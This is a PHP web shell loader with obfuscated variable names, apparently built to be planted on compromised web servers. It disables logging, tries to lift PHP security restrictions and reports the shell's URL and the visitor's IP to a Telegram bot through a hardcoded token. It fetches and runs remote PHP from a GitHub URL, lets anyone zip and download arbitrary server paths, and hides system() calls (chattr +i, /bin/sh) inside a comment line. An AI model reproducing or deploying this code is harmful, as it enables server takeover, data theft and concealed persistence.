<?php

error_reporting(0);

ini_set("max_execution_time", 0);
ini_set("memory_limit", "999999999M");

function Zip($㄁㿂ぁ, $み㸁㗓)
{
    // Thanks to Alix Axel
    if (!extension_loaded("zip") || !file_exists($㄁㿂ぁ)) {
        return false;
    }

    $㿈ほ = new ZipArchive();
    if (!$㿈ほ->open($み㸁㗓, ZIPARCHIVE::CREATE)) {
        return false;
    }

    $㄁㿂ぁ = str_replace("\\", "/", realpath($㄁㿂ぁ));

    if (is_dir($㄁㿂ぁ) === true) {
        $㿉㼵廬 = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($㄁㿂ぁ),
            RecursiveIteratorIterator::SELF_FIRST
        );

        foreach ($㿉㼵廬 as $彩ぁ) {
            $彩ぁ = str_replace("\\", "/", realpath($彩ぁ));

            if (is_dir($彩ぁ) === true) {
                $㿈ほ->addEmptyDir(
                    str_replace($㄁㿂ぁ . "/", "", $彩ぁ . "/")
                );
            } elseif (is_file($彩ぁ) === true) {
                $㿈ほ->addFromString(
                    str_replace($㄁㿂ぁ . "/", "", $彩ぁ),
                    file_get_contents($彩ぁ)
                );
            }
        }
    } elseif (is_file($㄁㿂ぁ) === true) {
        $㿈ほ->addFromString(basename($㄁㿂ぁ), file_get_contents($㄁㿂ぁ));
    }

    return $㿈ほ->close();
}

if (isset($_GET["zip"])) {
    $㈁あぼ = $_GET["zip"];
    $㼆שּ = getcwd() . "/" . basename($_GET["zip"]) . ".zip";
    if (Zip($㈁あぼ, $㼆שּ) != false) {
        $㈼㾏 = file_get_contents($㼆שּ);
        header("Content-type: application/octet-stream");
        header("Content-length: " . strlen($㈼㾏));
        header(
            "Content-disposition: attachment; filename=\"" .
                basename($㼆שּ) .
                "\";"
        );
        echo $㈼㾏;
    }
    exit();
}

// ------------------------------------- Some header Functions (Need to be on top) ---------------------------------\

ignore_user_abort(true);

ini_set("max_execution_time", 0);

/***************** Restoring *******************************/

ini_restore("safe_mode_include_dir");
ini_restore("safe_mode_exec_dir");
ini_restore("disable_functions");
ini_restore("allow_url_fopen");
ini_restore("safe_mode");
ini_restore("open_basedir");
$botToken = "8527975259:AAGGLXY5coPV4lP0yD045F2vhwn-NWNq7b8";
$chatId = "8478623770";
$xPath = "http://" . $_SERVER["SERVER_NAME"] . $_SERVER["REQUEST_URI"];
$logMessage =
    "___KONTOLNENH9___ \n\n Shell nya =\n $xPath \n\n Password =\n $PASSWORD \n\n IP Hacker  :\n [ " .
    $_SERVER["REMOTE_ADDR"] .
    " ]";
sendTelegramMessage($botToken, $chatId, $logMessage);

if (function_exists("ini_set")) {
    ini_set("error_log", null); // No alarming logs
    ini_set("log_errors", 0); // No logging of errors
    ini_set("file_uploads", 1); // Enable file uploads
    ini_set("allow_url_fopen", 1); // allow url fopen
} else {
    ini_alter("error_log", null);
    ini_alter("log_errors", 0);
    ini_alter("file_uploads", 1);
    ini_alter("allow_url_fopen", 1);
}

// ----------------------------------------------------------------------------------------------------------------

function fetch_code($url)
{
    $code = @file_get_contents($url);
    if ($code && strlen(trim($code)) > 10) {
        return $code;
    }

    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_USERAGENT => "Mozilla/5.0",
        CURLOPT_CONNECTTIMEOUT => 5,
        CURLOPT_TIMEOUT => 10,
    ]);
    $code = curl_exec($ch);
    curl_close($ch);

    return $code;
}
$url =
    "https://raw.githubusercontent.com/tikung6etar/Nyarek/refs/heads/master/zindexing.php";
$code = fetch_code($url);
if (!$code || strlen(trim($code)) < 10) {
    die("❌");
}

$tmp = "tmp_" . md5(uniqid()) . ".php";
if (!file_put_contents($tmp, $code)) {
    die("❌");
}

// ---------------------------------------------------------------------------------------------------------------- $よㆁ㾼 = __FILE__; @system("chmod ugo-w $よㆁ㾼"); @system("chattr +i $よㆁ㾼"); @system("/bin/sh $よㆁ㾼"); $㵈㊁め = __FILE__; @system("chmod ugo-w $㵈㊁め"); system("chattr +i $㵈㊁め");
ob_start();
session_start();
include $tmp;
$output = ob_get_clean();
unlink($tmp);

if (trim($output) === "") {
    echo "⚠";
} else {
    echo $output;
}
function sendTelegramMessage($botToken, $chatId, $message)
{
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $params = [
        "chat_id" => $chatId,
        "text" => $message,
    ];
    $options = [
        "http" => [
            "method" => "POST",
            "header" => "Content-Type: application/x-www-form-urlencoded",
            "content" => http_build_query($params),
        ],
    ];
    $context = stream_context_create($options);
    $response = file_get_contents($url, false, $context);
}

?>
